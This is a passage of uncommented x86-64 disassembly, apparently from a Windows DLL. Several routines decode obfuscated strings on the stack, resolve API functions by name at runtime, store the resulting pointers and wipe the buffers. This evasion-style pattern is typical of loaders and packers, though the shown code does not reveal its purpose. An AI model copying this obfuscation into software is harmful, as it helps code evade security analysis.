   180002d71:	0f ba e3 17          	bt     $0x17,%ebx
   180002d75:	73 17                	jae    0x180002d8e
   180002d77:	0f ba f3 17          	btr    $0x17,%ebx
   180002d7b:	48 8b c6             	mov    %rsi,%rax
   180002d7e:	66 90                	xchg   %ax,%ax
   180002d80:	40 88 74 05 29       	mov    %sil,0x29(%rbp,%rax,1)
   180002d85:	48 ff c0             	inc    %rax
   180002d88:	48 83 f8 11          	cmp    $0x11,%rax
   180002d8c:	72 f2                	jb     0x180002d80
   180002d8e:	0f ba e3 16          	bt     $0x16,%ebx
   180002d92:	73 1a                	jae    0x180002dae
   180002d94:	0f ba f3 16          	btr    $0x16,%ebx
   180002d98:	48 8b c6             	mov    %rsi,%rax
   180002d9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002da0:	40 88 74 05 8e       	mov    %sil,-0x72(%rbp,%rax,1)
   180002da5:	48 ff c0             	inc    %rax
   180002da8:	48 83 f8 0e          	cmp    $0xe,%rax
   180002dac:	72 f2                	jb     0x180002da0
   180002dae:	0f ba e3 15          	bt     $0x15,%ebx
   180002db2:	73 1a                	jae    0x180002dce
   180002db4:	0f ba f3 15          	btr    $0x15,%ebx
   180002db8:	48 8b c6             	mov    %rsi,%rax
   180002dbb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002dc0:	40 88 74 05 af       	mov    %sil,-0x51(%rbp,%rax,1)
   180002dc5:	48 ff c0             	inc    %rax
   180002dc8:	48 83 f8 0f          	cmp    $0xf,%rax
   180002dcc:	72 f2                	jb     0x180002dc0
   180002dce:	0f ba e3 14          	bt     $0x14,%ebx
   180002dd2:	73 1a                	jae    0x180002dee
   180002dd4:	0f ba f3 14          	btr    $0x14,%ebx
   180002dd8:	48 8b c6             	mov    %rsi,%rax
   180002ddb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180002de0:	40 88 74 04 4f       	mov    %sil,0x4f(%rsp,%rax,1)
   180002de5:	48 ff c0             	inc    %rax
   180002de8:	48 83 f8 0f          	cmp    $0xf,%rax
   180002dec:	72 f2                	jb     0x180002de0
   180002dee:	0f ba e3 13          	bt     $0x13,%ebx
   180002df2:	73 1d                	jae    0x180002e11
   180002df4:	48 8b c6             	mov    %rsi,%rax
   180002df7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180002dfe:	00 00 
   180002e00:	40 88 b4 05 88 00 00 	mov    %sil,0x88(%rbp,%rax,1)
   180002e07:	00 
   180002e08:	48 ff c0             	inc    %rax
   180002e0b:	48 83 f8 10          	cmp    $0x10,%rax
   180002e0f:	72 ef                	jb     0x180002e00
   180002e11:	0f ba e3 12          	bt     $0x12,%ebx
   180002e15:	73 17                	jae    0x180002e2e
   180002e17:	48 8b c6             	mov    %rsi,%rax
   180002e1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180002e20:	40 88 74 05 59       	mov    %sil,0x59(%rbp,%rax,1)
   180002e25:	48 ff c0             	inc    %rax
   180002e28:	48 83 f8 19          	cmp    $0x19,%rax
   180002e2c:	72 f2                	jb     0x180002e20
   180002e2e:	84 c9                	test   %cl,%cl
   180002e30:	0f 85 42 04 00 00    	jne    0x180003278
   180002e36:	33 c0                	xor    %eax,%eax
   180002e38:	c7 85 a8 01 00 00 56 	movl   $0x570056,0x1a8(%rbp)
   180002e3f:	00 57 00 
   180002e42:	66 89 85 8e 00 00 00 	mov    %ax,0x8e(%rbp)
   180002e49:	48 8d 8d a8 01 00 00 	lea    0x1a8(%rbp),%rcx
   180002e50:	89 85 ce 01 00 00    	mov    %eax,0x1ce(%rbp)
   180002e56:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002e59:	66 89 85 d2 01 00 00 	mov    %ax,0x1d2(%rbp)
   180002e60:	bb 14 00 00 00       	mov    $0x14,%ebx
   180002e65:	b8 2d 00 00 00       	mov    $0x2d,%eax
   180002e6a:	c7 85 ac 01 00 00 40 	movl   $0x540040,0x1ac(%rbp)
   180002e71:	00 54 00 
   180002e74:	66 89 85 bc 01 00 00 	mov    %ax,0x1bc(%rbp)
   180002e7b:	0f 11 85 be 01 00 00 	movups %xmm0,0x1be(%rbp)
   180002e82:	c7 85 b0 01 00 00 14 	movl   $0x1a0014,0x1b0(%rbp)
   180002e89:	00 1a 00 
   180002e8c:	c7 85 b4 01 00 00 07 	movl   $0x4e0007,0x1b4(%rbp)
   180002e93:	00 4e 00 
   180002e96:	c7 85 b8 01 00 00 47 	movl   $0x400047,0x1b8(%rbp)
   180002e9d:	00 40 00 
   180002ea0:	e8 3b b8 00 00       	call   0x18000e6e0
   180002ea5:	48 8b c8             	mov    %rax,%rcx
   180002ea8:	ff 15 62 32 02 00    	call   *0x23262(%rip)        # 0x180026110
   180002eae:	48 8b f8             	mov    %rax,%rdi
   180002eb1:	48 85 c0             	test   %rax,%rax
   180002eb4:	0f 84 7c 03 00 00    	je     0x180003236
   180002eba:	66 0f 6f 0d de 1c 3a 	movdqa 0x3a1cde(%rip),%xmm1        # 0x1803a4ba0
   180002ec1:	00 
   180002ec2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002ec7:	33 c0                	xor    %eax,%eax
   180002ec9:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002ecd:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180002ed2:	48 89 44 24 2c       	mov    %rax,0x2c(%rsp)
   180002ed7:	89 44 24 34          	mov    %eax,0x34(%rsp)
   180002edb:	66 0f 7e c8          	movd   %xmm1,%eax
   180002edf:	88 44 24 20          	mov    %al,0x20(%rsp)
   180002ee3:	66 0f 7e c0          	movd   %xmm0,%eax
   180002ee7:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002eeb:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180002ef0:	88 44 24 21          	mov    %al,0x21(%rsp)
   180002ef4:	66 0f 7e c0          	movd   %xmm0,%eax
   180002ef8:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002efc:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180002f01:	88 44 24 22          	mov    %al,0x22(%rsp)
   180002f05:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f09:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002f0d:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180002f12:	88 44 24 23          	mov    %al,0x23(%rsp)
   180002f16:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f1a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002f1e:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180002f23:	88 44 24 24          	mov    %al,0x24(%rsp)
   180002f27:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f2b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002f2f:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180002f34:	88 44 24 25          	mov    %al,0x25(%rsp)
   180002f38:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f3c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002f40:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180002f45:	88 44 24 26          	mov    %al,0x26(%rsp)
   180002f49:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f4d:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002f51:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180002f56:	88 44 24 27          	mov    %al,0x27(%rsp)
   180002f5a:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f5e:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002f62:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180002f67:	88 44 24 28          	mov    %al,0x28(%rsp)
   180002f6b:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f6f:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002f73:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180002f78:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   180002f7d:	88 44 24 29          	mov    %al,0x29(%rsp)
   180002f81:	66 0f 7e c0          	movd   %xmm0,%eax
   180002f85:	88 44 24 2a          	mov    %al,0x2a(%rsp)
   180002f89:	66 0f 7e c8          	movd   %xmm1,%eax
   180002f8d:	88 44 24 2b          	mov    %al,0x2b(%rsp)
   180002f91:	e8 aa b3 00 00       	call   0x18000e340
   180002f96:	48 8b d0             	mov    %rax,%rdx
   180002f99:	48 8b cf             	mov    %rdi,%rcx
   180002f9c:	ff 15 8e 31 02 00    	call   *0x2318e(%rip)        # 0x180026130
   180002fa2:	48 89 05 77 7d 3a 00 	mov    %rax,0x3a7d77(%rip)        # 0x1803aad20
   180002fa9:	48 85 c0             	test   %rax,%rax
   180002fac:	0f 84 29 02 00 00    	je     0x1800031db
   180002fb2:	66 0f 6f 0d f6 1d 3a 	movdqa 0x3a1df6(%rip),%xmm1        # 0x1803a4db0
   180002fb9:	00 
   180002fba:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002fbf:	33 c0                	xor    %eax,%eax
   180002fc1:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002fc5:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180002fca:	48 89 44 24 4f       	mov    %rax,0x4f(%rsp)
   180002fcf:	89 44 24 57          	mov    %eax,0x57(%rsp)
   180002fd3:	66 89 44 24 5b       	mov    %ax,0x5b(%rsp)
   180002fd8:	88 44 24 5d          	mov    %al,0x5d(%rsp)
   180002fdc:	66 0f 7e c8          	movd   %xmm1,%eax
   180002fe0:	88 44 24 40          	mov    %al,0x40(%rsp)
   180002fe4:	66 0f 7e c0          	movd   %xmm0,%eax
   180002fe8:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002fec:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   180002ff1:	88 44 24 41          	mov    %al,0x41(%rsp)
   180002ff5:	66 0f 7e c0          	movd   %xmm0,%eax
   180002ff9:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180002ffd:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180003002:	88 44 24 42          	mov    %al,0x42(%rsp)
   180003006:	66 0f 7e c0          	movd   %xmm0,%eax
   18000300a:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000300e:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180003013:	88 44 24 43          	mov    %al,0x43(%rsp)
   180003017:	66 0f 7e c0          	movd   %xmm0,%eax
   18000301b:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000301f:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180003024:	88 44 24 44          	mov    %al,0x44(%rsp)
   180003028:	66 0f 7e c0          	movd   %xmm0,%eax
   18000302c:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003030:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180003035:	88 44 24 45          	mov    %al,0x45(%rsp)
   180003039:	66 0f 7e c0          	movd   %xmm0,%eax
   18000303d:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003041:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180003046:	88 44 24 46          	mov    %al,0x46(%rsp)
   18000304a:	66 0f 7e c0          	movd   %xmm0,%eax
   18000304e:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003052:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180003057:	88 44 24 47          	mov    %al,0x47(%rsp)
   18000305b:	66 0f 7e c0          	movd   %xmm0,%eax
   18000305f:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003063:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180003068:	88 44 24 48          	mov    %al,0x48(%rsp)
   18000306c:	66 0f 7e c0          	movd   %xmm0,%eax
   180003070:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003074:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180003079:	88 44 24 49          	mov    %al,0x49(%rsp)
   18000307d:	66 0f 7e c0          	movd   %xmm0,%eax
   180003081:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003085:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   18000308a:	88 44 24 4a          	mov    %al,0x4a(%rsp)
   18000308e:	66 0f 7e c0          	movd   %xmm0,%eax
   180003092:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003096:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   18000309b:	88 44 24 4b          	mov    %al,0x4b(%rsp)
   18000309f:	66 0f 7e c0          	movd   %xmm0,%eax
   1800030a3:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800030a7:	66 0f 73 d8 0d       	psrldq $0xd,%xmm0
   1800030ac:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   1800030b1:	88 44 24 4c          	mov    %al,0x4c(%rsp)
   1800030b5:	66 0f 7e c0          	movd   %xmm0,%eax
   1800030b9:	88 44 24 4d          	mov    %al,0x4d(%rsp)
   1800030bd:	66 0f 7e c8          	movd   %xmm1,%eax
   1800030c1:	88 44 24 4e          	mov    %al,0x4e(%rsp)
   1800030c5:	e8 a6 b3 00 00       	call   0x18000e470
   1800030ca:	48 8b d0             	mov    %rax,%rdx
   1800030cd:	48 8b cf             	mov    %rdi,%rcx
   1800030d0:	ff 15 5a 30 02 00    	call   *0x2305a(%rip)        # 0x180026130
   1800030d6:	48 89 05 3b 7b 3a 00 	mov    %rax,0x3a7b3b(%rip)        # 0x1803aac18
   1800030dd:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   1800030e3:	48 85 c0             	test   %rax,%rax
   1800030e6:	0f 84 ef 00 00 00    	je     0x1800031db
   1800030ec:	66 0f 6f 0d cc 1a 3a 	movdqa 0x3a1acc(%rip),%xmm1        # 0x1803a4bc0
   1800030f3:	00 
   1800030f4:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800030f8:	33 c0                	xor    %eax,%eax
   1800030fa:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800030fe:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   180003103:	48 89 45 8c          	mov    %rax,-0x74(%rbp)
   180003107:	89 45 94             	mov    %eax,-0x6c(%rbp)
   18000310a:	66 0f 7e c8          	movd   %xmm1,%eax
   18000310e:	88 45 80             	mov    %al,-0x80(%rbp)
   180003111:	66 0f 7e c0          	movd   %xmm0,%eax
   180003115:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003119:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   18000311e:	88 45 81             	mov    %al,-0x7f(%rbp)
   180003121:	66 0f 7e c0          	movd   %xmm0,%eax
   180003125:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003129:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   18000312e:	88 45 82             	mov    %al,-0x7e(%rbp)
   180003131:	66 0f 7e c0          	movd   %xmm0,%eax
   180003135:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003139:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   18000313e:	88 45 83             	mov    %al,-0x7d(%rbp)
   180003141:	66 0f 7e c0          	movd   %xmm0,%eax
   180003145:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003149:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   18000314e:	88 45 84             	mov    %al,-0x7c(%rbp)
   180003151:	66 0f 7e c0          	movd   %xmm0,%eax
   180003155:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003159:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   18000315e:	88 45 85             	mov    %al,-0x7b(%rbp)
   180003161:	66 0f 7e c0          	movd   %xmm0,%eax
   180003165:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003169:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   18000316e:	88 45 86             	mov    %al,-0x7a(%rbp)
   180003171:	66 0f 7e c0          	movd   %xmm0,%eax
   180003175:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003179:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   18000317e:	88 45 87             	mov    %al,-0x79(%rbp)
   180003181:	66 0f 7e c0          	movd   %xmm0,%eax
   180003185:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003189:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   18000318e:	88 45 88             	mov    %al,-0x78(%rbp)
   180003191:	66 0f 7e c0          	movd   %xmm0,%eax
   180003195:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   180003199:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   18000319e:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   1800031a3:	88 45 89             	mov    %al,-0x77(%rbp)
   1800031a6:	66 0f 7e c0          	movd   %xmm0,%eax
   1800031aa:	88 45 8a             	mov    %al,-0x76(%rbp)
   1800031ad:	66 0f 7e c8          	movd   %xmm1,%eax
   1800031b1:	88 45 8b             	mov    %al,-0x75(%rbp)
   1800031b4:	e8 87 b1 00 00       	call   0x18000e340
   1800031b9:	48 8b d0             	mov    %rax,%rdx
   1800031bc:	48 8b cf             	mov    %rdi,%rcx
   1800031bf:	ff 15 6b 2f 02 00    	call   *0x22f6b(%rip)        # 0x180026130
   1800031c5:	48 89 05 54 7a 3a 00 	mov    %rax,0x3a7a54(%rip)        # 0x1803aac20
   1800031cc:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   1800031d2:	48 85 c0             	test   %rax,%rax
   1800031d5:	74 04                	je     0x1800031db
   1800031d7:	32 c9                	xor    %cl,%cl
   1800031d9:	eb 02                	jmp    0x1800031dd
   1800031db:	b1 01                	mov    $0x1,%cl
   1800031dd:	41 f6 c7 02          	test   $0x2,%r15b
   1800031e1:	74 1b                	je     0x1800031fe
   1800031e3:	41 83 e7 fd          	and    $0xfffffffd,%r15d
   1800031e7:	48 8b c6             	mov    %rsi,%rax
   1800031ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800031f0:	40 88 74 05 8c       	mov    %sil,-0x74(%rbp,%rax,1)
   1800031f5:	48 ff c0             	inc    %rax
   1800031f8:	48 83 f8 0c          	cmp    $0xc,%rax
   1800031fc:	72 f2                	jb     0x1800031f0
   1800031fe:	41 f6 c7 01          	test   $0x1,%r15b
   180003202:	74 1c                	je     0x180003220
   180003204:	48 8b c6             	mov    %rsi,%rax
   180003207:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000320e:	00 00 
   180003210:	40 88 74 04 4f       	mov    %sil,0x4f(%rsp,%rax,1)
   180003215:	48 ff c0             	inc    %rax
   180003218:	48 83 f8 0f          	cmp    $0xf,%rax
   18000321c:	72 f2                	jb     0x180003210
   18000321e:	66 90                	xchg   %ax,%ax
   180003220:	c6 44 34 2c 00       	movb   $0x0,0x2c(%rsp,%rsi,1)
   180003225:	48 ff c6             	inc    %rsi
   180003228:	48 83 fe 0c          	cmp    $0xc,%rsi
   18000322c:	72 f2                	jb     0x180003220
   18000322e:	84 c9                	test   %cl,%cl
   180003230:	75 04                	jne    0x180003236
   180003232:	b2 01                	mov    $0x1,%dl
   180003234:	eb 02                	jmp    0x180003238
   180003236:	32 d2                	xor    %dl,%dl
   180003238:	33 c0                	xor    %eax,%eax
   18000323a:	48 8d bd be 01 00 00 	lea    0x1be(%rbp),%rdi
   180003241:	b9 16 00 00 00       	mov    $0x16,%ecx
   180003246:	f3 aa                	rep stos %al,(%rdi)
   180003248:	48 8d bd 4a 02 00 00 	lea    0x24a(%rbp),%rdi
   18000324f:	49 8b cc             	mov    %r12,%rcx
   180003252:	f3 aa                	rep stos %al,(%rdi)
   180003254:	48 8d bd 1c 02 00 00 	lea    0x21c(%rbp),%rdi
   18000325b:	48 8b cb             	mov    %rbx,%rcx
   18000325e:	f3 aa                	rep stos %al,(%rdi)
   180003260:	48 8d bd 80 02 00 00 	lea    0x280(%rbp),%rdi
   180003267:	33 c0                	xor    %eax,%eax
   180003269:	b9 18 00 00 00       	mov    $0x18,%ecx
   18000326e:	f3 aa                	rep stos %al,(%rdi)
   180003270:	eb 74                	jmp    0x1800032e6
   180003272:	41 bc 1a 00 00 00    	mov    $0x1a,%r12d
   180003278:	32 d2                	xor    %dl,%dl
   18000327a:	48 8d bd 4a 02 00 00 	lea    0x24a(%rbp),%rdi
   180003281:	33 c0                	xor    %eax,%eax
   180003283:	49 8b cc             	mov    %r12,%rcx
   180003286:	f3 aa                	rep stos %al,(%rdi)
   180003288:	bb 14 00 00 00       	mov    $0x14,%ebx
   18000328d:	48 8d bd 1c 02 00 00 	lea    0x21c(%rbp),%rdi
   180003294:	8b cb                	mov    %ebx,%ecx
   180003296:	f3 aa                	rep stos %al,(%rdi)
   180003298:	48 8d bd 80 02 00 00 	lea    0x280(%rbp),%rdi
   18000329f:	33 c0                	xor    %eax,%eax
   1800032a1:	b9 18 00 00 00       	mov    $0x18,%ecx
   1800032a6:	f3 aa                	rep stos %al,(%rdi)
   1800032a8:	eb 3c                	jmp    0x1800032e6
   1800032aa:	32 d2                	xor    %dl,%dl
   1800032ac:	48 8d bd 1c 02 00 00 	lea    0x21c(%rbp),%rdi
   1800032b3:	bb 14 00 00 00       	mov    $0x14,%ebx
   1800032b8:	33 c0                	xor    %eax,%eax
   1800032ba:	8b cb                	mov    %ebx,%ecx
   1800032bc:	f3 aa                	rep stos %al,(%rdi)
   1800032be:	48 8d bd 80 02 00 00 	lea    0x280(%rbp),%rdi
   1800032c5:	33 c0                	xor    %eax,%eax
   1800032c7:	b9 18 00 00 00       	mov    $0x18,%ecx
   1800032cc:	f3 aa                	rep stos %al,(%rdi)
   1800032ce:	eb 16                	jmp    0x1800032e6
   1800032d0:	32 d2                	xor    %dl,%dl
   1800032d2:	48 8d bd 80 02 00 00 	lea    0x280(%rbp),%rdi
   1800032d9:	33 c0                	xor    %eax,%eax
   1800032db:	b9 18 00 00 00       	mov    $0x18,%ecx
   1800032e0:	f3 aa                	rep stos %al,(%rdi)
   1800032e2:	eb 02                	jmp    0x1800032e6
   1800032e4:	32 d2                	xor    %dl,%dl
   1800032e6:	33 c0                	xor    %eax,%eax
   1800032e8:	48 8d bd ee 01 00 00 	lea    0x1ee(%rbp),%rdi
   1800032ef:	b9 16 00 00 00       	mov    $0x16,%ecx
   1800032f4:	f3 aa                	rep stos %al,(%rdi)
   1800032f6:	0f b6 c2             	movzbl %dl,%eax
   1800032f9:	48 8b 8d 98 02 00 00 	mov    0x298(%rbp),%rcx
   180003300:	48 33 cc             	xor    %rsp,%rcx
   180003303:	e8 a8 b8 00 00       	call   0x18000ebb0
   180003308:	4c 8d 9c 24 a0 03 00 	lea    0x3a0(%rsp),%r11
   18000330f:	00 
   180003310:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180003314:	49 8b 73 38          	mov    0x38(%r11),%rsi
   180003318:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   18000331c:	49 8b e3             	mov    %r11,%rsp
   18000331f:	41 5f                	pop    %r15
   180003321:	41 5e                	pop    %r14
   180003323:	41 5d                	pop    %r13
   180003325:	41 5c                	pop    %r12
   180003327:	5d                   	pop    %rbp
   180003328:	c3                   	ret
   180003329:	cc                   	int3
   18000332a:	cc                   	int3
   18000332b:	cc                   	int3
   18000332c:	cc                   	int3
   18000332d:	cc                   	int3
   18000332e:	cc                   	int3
   18000332f:	cc                   	int3
   180003330:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003335:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000333a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000333f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180003344:	55                   	push   %rbp
   180003345:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   18000334a:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   180003351:	48 8b 05 a8 5c 3a 00 	mov    0x3a5ca8(%rip),%rax        # 0x1803a9000
   180003358:	48 33 c4             	xor    %rsp,%rax
   18000335b:	48 89 45 47          	mov    %rax,0x47(%rbp)
   18000335f:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   180003364:	33 c0                	xor    %eax,%eax
   180003366:	66 89 45 9d          	mov    %ax,-0x63(%rbp)
   18000336a:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000336d:	0f 11 45 2d          	movups %xmm0,0x2d(%rbp)
   180003371:	89 45 3d             	mov    %eax,0x3d(%rbp)
   180003374:	66 89 45 41          	mov    %ax,0x41(%rbp)
   180003378:	c7 45 17 41 00 47 00 	movl   $0x470041,0x17(%rbp)
   18000337f:	c7 45 1b 57 00 5f 00 	movl   $0x5f0057,0x1b(%rbp)
   180003386:	c7 45 1f 57 00 5c 00 	movl   $0x5c0057,0x1f(%rbp)
   18000338d:	c7 45 23 07 00 4e 00 	movl   $0x4e0007,0x23(%rbp)
   180003394:	c7 45 27 47 00 40 00 	movl   $0x400047,0x27(%rbp)
   18000339b:	66 89 4d 2b          	mov    %cx,0x2b(%rbp)
   18000339f:	48 8d 4d 17          	lea    0x17(%rbp),%rcx
   1800033a3:	e8 38 b3 00 00       	call   0x18000e6e0
   1800033a8:	48 8b c8             	mov    %rax,%rcx
   1800033ab:	ff 15 a7 2d 02 00    	call   *0x22da7(%rip)        # 0x180026158
   1800033b1:	48 8b d8             	mov    %rax,%rbx
   1800033b4:	48 85 c0             	test   %rax,%rax
   1800033b7:	0f 84 a0 02 00 00    	je     0x18000365d
   1800033bd:	66 0f 6f 0d 4b 19 3a 	movdqa 0x3a194b(%rip),%xmm1        # 0x1803a4d10
   1800033c4:	00 
   1800033c5:	33 c0                	xor    %eax,%eax
   1800033c7:	48 89 45 95          	mov    %rax,-0x6b(%rbp)
   1800033cb:	89 45 9d             	mov    %eax,-0x63(%rbp)
   1800033ce:	66 89 45 a1          	mov    %ax,-0x5f(%rbp)
   1800033d2:	66 0f 7e c9          	movd   %xmm1,%ecx
   1800033d6:	88 4d 87             	mov    %cl,-0x79(%rbp)
   1800033d9:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800033dd:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1800033e2:	66 0f 7e c0          	movd   %xmm0,%eax
   1800033e6:	88 45 88             	mov    %al,-0x78(%rbp)
   1800033e9:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800033ed:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   1800033f2:	66 0f 7e c0          	movd   %xmm0,%eax
   1800033f6:	88 45 89             	mov    %al,-0x77(%rbp)
   1800033f9:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   1800033fd:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   180003402:	66 0f 7e c0          	movd   %xmm0,%eax
   180003406:	88 45 8a             	mov    %al,-0x76(%rbp)
   180003409:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000340d:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   180003412:	66 0f 7e c0          	movd   %xmm0,%eax
   180003416:	88 45 8b             	mov    %al,-0x75(%rbp)
   180003419:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000341d:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   180003422:	66 0f 7e c0          	movd   %xmm0,%eax
   180003426:	88 45 8c             	mov    %al,-0x74(%rbp)
   180003429:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000342d:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   180003432:	66 0f 7e c0          	movd   %xmm0,%eax
   180003436:	88 45 8d             	mov    %al,-0x73(%rbp)
   180003439:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000343d:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   180003442:	66 0f 7e c0          	movd   %xmm0,%eax
   180003446:	88 45 8e             	mov    %al,-0x72(%rbp)
   180003449:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000344d:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   180003452:	66 0f 7e c0          	movd   %xmm0,%eax
   180003456:	88 45 8f             	mov    %al,-0x71(%rbp)
   180003459:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000345d:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   180003462:	66 0f 7e c0          	movd   %xmm0,%eax
   180003466:	88 45 90             	mov    %al,-0x70(%rbp)
   180003469:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000346d:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   180003472:	66 0f 7e c0          	movd   %xmm0,%eax
   180003476:	88 45 91             	mov    %al,-0x6f(%rbp)
   180003479:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000347d:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   180003482:	66 0f 7e c0          	movd   %xmm0,%eax
   180003486:	88 45 92             	mov    %al,-0x6e(%rbp)
   180003489:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   18000348d:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   180003492:	66 0f 7e c0          	movd   %xmm0,%eax
   180003496:	88 45 93             	mov    %al,-0x6d(%rbp)
   180003499:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   18000349e:	66 0f 7e c8          	movd   %xmm1,%eax
   1800034a2:	88 45 94             	mov    %al,-0x6c(%rbp)
   1800034a5:	48 8d 4d 87          	lea    -0x79(%rbp),%rcx
   1800034a9:	e8 12 b1 00 00       	call   0x18000e5c0
   1800034ae:	48 8b d0             	mov    %rax,%rdx
   1800034b1:	48 8b cb             	mov    %rbx,%rcx
   1800034b4:	ff 15 76 2c 02 00    	call   *0x22c76(%rip)        # 0x180026130
   1800034ba:	4c 8b f0             	mov    %rax,%r14
